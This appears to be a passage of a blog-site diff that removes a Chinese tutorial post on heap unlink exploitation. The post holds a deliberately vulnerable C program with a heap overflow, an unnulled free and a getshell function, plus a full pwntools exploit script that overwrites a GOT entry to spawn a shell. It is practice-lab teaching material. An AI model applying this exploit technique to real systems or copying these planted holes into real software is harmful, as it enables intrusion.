class="keyword">int</span> <span class="title">input</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> buf[<span class="number">8</span>];</span><br><span class="line">	read(<span class="number">0</span>,&amp;buf,<span class="number">8</span>);</span><br><span class="line">	<span class="keyword">int</span> result = atoi(&amp;buf);</span><br><span class="line">	<span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Create</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> nbytes,i=<span class="number">0</span>;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"Size: "</span>,<span class="number">6</span>);</span><br><span class="line">	nbytes = input();</span><br><span class="line">	<span class="keyword">char</span> *p = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(nbytes);</span><br><span class="line">	<span class="keyword">if</span>(p)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">while</span>(buf[i] &amp;&amp; i &lt;= <span class="number">9</span>)	i++;</span><br><span class="line">		<span class="keyword">if</span> (i == <span class="number">10</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			write(<span class="number">1</span>,<span class="string">"List is Full!\n"</span>,<span class="number">0xE</span>);</span><br><span class="line">			<span class="built_in">free</span>(p);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			write(<span class="number">1</span>,<span class="string">"Data: "</span>,<span class="number">0x6</span>);</span><br><span class="line">			read(<span class="number">0</span>,p,nbytes);</span><br><span class="line">			buf[i] = p;</span><br><span class="line">			</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Delete</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"Index: "</span>,<span class="number">0x7</span>);</span><br><span class="line">	<span class="keyword">int</span> idx = input();</span><br><span class="line">	<span class="keyword">if</span>((<span class="keyword">unsigned</span> <span class="keyword">int</span>)idx &lt;= <span class="number">9</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">free</span>(buf[idx]);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Update</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	write(<span class="number">1</span>,<span class="string">"Index: "</span>,<span class="number">0x7</span>);</span><br><span class="line">	<span class="keyword">int</span> idx = input();</span><br><span class="line">	<span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)idx &lt;= <span class="number">9</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(buf[idx])</span><br><span class="line">		&#123;</span><br><span class="line">			write(<span class="number">1</span>,<span class="string">"Size: "</span>,<span class="number">0x6</span>);</span><br><span class="line">			<span class="keyword">int</span> nbytes = input();</span><br><span class="line">			write(<span class="number">1</span>,<span class="string">"Data: "</span>,<span class="number">0x6</span>);</span><br><span class="line">			read(<span class="number">0</span>,buf[idx],nbytes); <span class="comment">//overflow</span></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> choice;</span><br><span class="line">	<span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		Menu();</span><br><span class="line">		choice = input();</span><br><span class="line">		<span class="keyword">switch</span>(choice)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">				Create();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">				Delete();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">				Update();</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			<span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">				<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">			<span class="keyword">default</span>:</span><br><span class="line">				write(<span class="number">1</span>,<span class="string">"Wrong choice\n"</span>,<span class="number">0xD</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-<p>gcc unlink_test.c -o unlink_test</p>
-<p>生成的程序默认开启NX，Canary以及Partial RELRO，能够通过写got表，实现getshell。</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Update</span><span class="params">(idx,size,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Data: "</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Index: "</span>)</span><br><span class="line">	p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">Create</span><span class="params">(size,payload)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"Size: "</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Data: "</span>)</span><br><span class="line">	p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exitProcess</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice :"</span>)</span><br><span class="line">	p.sendline(<span class="string">"4"</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">"./unlink_test"</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">Create(<span class="number">0x80</span>,<span class="string">"A"</span>*<span class="number">16</span>)</span><br><span class="line">Create(<span class="number">0x80</span>,<span class="string">"B"</span>*<span class="number">16</span>)</span><br><span class="line">payload1 = p64(<span class="number">0</span>) + p64(<span class="number">0x81</span>) + p64(<span class="number">0x6010A0</span><span class="number">-0x18</span>) + p64(<span class="number">0x6010A0</span><span class="number">-0x10</span>) + <span class="string">"A"</span>*<span class="number">0x60</span> + p64(<span class="number">0x80</span>) + p64(<span class="number">0x90</span>)</span><br><span class="line">Update(<span class="number">0</span>,len(payload1),payload1)</span><br><span class="line">Delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload2 = p64(<span class="number">0</span>)*<span class="number">3</span> + p64(<span class="number">0x601058</span>)</span><br><span class="line">Update(<span class="number">0</span>,len(payload2),payload2)</span><br><span class="line">payload3 = p64(<span class="number">0x4009D4</span>)</span><br><span class="line">Update(<span class="number">0</span>,len(payload3),payload3)</span><br><span class="line"></span><br><span class="line">exitProcess()</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1145,7 +1187,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">35</span>
+          <span class="site-state-item-count">37</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
